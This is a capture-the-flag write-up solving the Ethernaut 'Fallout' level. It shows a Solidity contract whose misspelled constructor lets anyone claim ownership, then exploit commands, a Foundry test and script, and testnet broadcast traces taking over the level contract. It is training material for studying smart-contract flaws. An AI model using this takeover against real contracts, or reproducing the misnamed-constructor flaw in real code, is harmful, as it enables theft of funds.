## 👾 02. Fallout

<br>
  
<p align="center">
<img width="300" src="https://github.com/go-outside-labs/ethernaut-foundry-detailed-solutions-sol/assets/138340846/e226964c-4827-45ba-b976-bbaa8b4e081b">
</p>





<br>


### tl; dr

<br>


* in this challenge, the contract's constructor function is misspelled, causing the contract to call an empty constructor. we explore this vulnerability to become `owner`.
  
* an example of this vulnerability exploited irl was when **[a company called Dynamic Piramid changed its name to Rubixi](https://blog.ethereum.org/2016/06/19/thinking-smart-contract-security)** but forgot to change its contract's constructor and ended up hacked.

<br>


```solidity
contract Fallout {

  mapping (address => uint) allocations;
  address payable public owner;

  /* constructor */
  function Fal1out() public payable {
    owner = payable(msg.sender);
    allocations[owner] = msg.value;
  }

  modifier onlyOwner {
    require(
      msg.sender == owner,
      "caller is not the owner"
    );
    _;
  }

  function allocate() public payable {
    allocations[msg.sender] = allocations[msg.sender] + (msg.value);
  }

  function sendAllocation(address payable allocator) public {
    require(allocations[allocator] > 0);
    allocator.transfer(allocations[allocator]);
  }

  function collectAllocations() public onlyOwner {
    payable(msg.sender).transfer(address(this).balance);
  }

  function allocatorBalance(address allocator) public view returns (uint) {
    return allocations[allocator];
  }
}
```


<br>

---

### discussion

<br>

* a constructor initializes the contract and the data within it.

<br>

* when a constructor has a different name from the contract, it becomes a regular method with a default `public` visibility (*i.e.*, they are part of the contract's interface and can be callable by anyone). this is the vulnerability we explore:

<br>

```solidity
  function Fal1out() public payable {
    owner = msg.sender;
    allocations[owner] = msg.value;
  }
```

  
<br>

* fun fact: before solidity `0.4.22`, defining a function with the same name as the contract was the only way to define its constructor. after that version, the `constructor` keyword was introduced.




<br>



----

### one-line solution with `cast`

<br>

```shell
> cast send <level address> "Fal1out()" --private-key <private key> --rpc-url=<sepolia url> 
```

<br>

----

### one-line solution in the console

<br>

```javascript
await contract.Fal1out();
```

<br>

---

### formal solidity solution

<br>

* i had to change the original contract a little to compile with foundry (*e.g.*, adding a couple of `payable` casting and removing `SafeMath` as it's not needed for `>= 0.8.0`).

<br>

* `test/02/Fallout.t.sol` is super simple:

<br>

```solidity
contract FalloutTest is Test {

    Fallout public level;

    address instance = vm.addr(0x10053); 
    address hacker = vm.addr(0x1337); 

    function setUp() public {

        vm.prank(instance);
        level = new Fallout();
    
    }

    function testFallbackHack() public {

        vm.startPrank(hacker);
        level.Fal1out();
        vm.stopPrank();
        
      }
}
```

<br>

* run:

<br>

```shell
> forge test --match-contract FalloutTest -vvvv    

Running 1 test for test/02/Fallout.t.sol:FalloutTest
[PASS] testFallbackHack() (gas: 35036)
Traces:
  [35036] FalloutTest::testFallbackHack() 
    ├─ [0] VM::startPrank(0x2B5AD5c4795c026514f8317c7a215E218DcCD6cF) 
    │   └─ ← ()
    ├─ [24507] Fallout::Fal1out() 
    │   └─ ← ()
    ├─ [0] VM::stopPrank() 
    │   └─ ← ()
    └─ ← ()

Test result: ok. 1 passed; 0 failed; 0 skipped; finished in 514.50µs
Ran 1 test suites: 1 tests passed, 0 failed, 0 skipped (1 total tests)
```



<br>

* a solution can be submitted with `script/02/Fallout.s.sol`:

<br>

```solidity
contract Exploit is Script {

    address instance = vm.envAddress("INSTANCE_LEVEL2");   
    address hacker = vm.rememberKey(vm.envUint("PRIVATE_KEY"));
    Fallout level = Fallout(payable(address(instance)));

    function run() external {
        vm.startBroadcast(hacker);
        level.Fal1out();
        vm.stopBroadcast();
    }
}
```

<br>

* by running:

<br>

```shell
> forge script ./script/02/Fallout.s.sol --broadcast -vvvv --rpc-url sepolia

[⠢] Compiling...
[⠃] Compiling 1 files with 0.8.21
[⠊] Solc 0.8.21 finished in 619.82ms
Compiler run successful!
Traces:
  [54327] Exploit::run() 
    ├─ [0] VM::envUint(PRIVATE_KEY) [staticcall]
    │   └─ ← <env var value>
    ├─ [0] VM::startBroadcast(<pk>) 
    │   └─ ← ()
    ├─ [24542] 0xAADB92d23788EA81c46fe22C4d4771B23dcc96a2::Fal1out() 
    │   └─ ← ()
    ├─ [0] VM::stopBroadcast() 
    │   └─ ← ()
    └─ ← ()


Script ran successfully.

## Setting up (1) EVMs.
==========================
Simulated On-chain Traces:

  [48456] 0xAADB92d23788EA81c46fe22C4d4771B23dcc96a2::Fal1out() 
    └─ ← ()


==========================

Chain 11155111

Estimated gas price: 3.397321144 gwei

Estimated total gas used for script: 62992

Estimated amount required: 0.000214004053502848 ETH

==========================

###
Finding wallets for all the necessary addresses...
##
Sending transactions [0 - 0].
⠁ [00:00:00] [#############################################################################################################################################################################################################] 1/1 txes (0.0s)

##
Waiting for receipts.
⠉ [00:00:12] [#########################################################################################################################################################################################################] 1/1 receipts (0.0s)
##### sepolia
✅  [Success]Hash: 0x398c258730c922336d269c8ee892f215573cc0ebce34605bb655c171b7fbe374
Block: 4097312
Paid: 0.00014700180794244 ETH (45606 gas * 3.22329974 gwei)

==========================

ONCHAIN EXECUTION COMPLETE & SUCCESSFUL.
Total Paid: 0.00014700180794244 ETH (45606 gas * avg 3.22329974 gwei)
```

<br>

----



### pwned...


<br>

  
<p align="center">
<img width="400" src="https://github.com/go-outside-labs/ethernaut-foundry-writeups-sol/assets/138340846/ba3f82a3-00c0-43f9-a423-588d7f6e4c70">
</p>



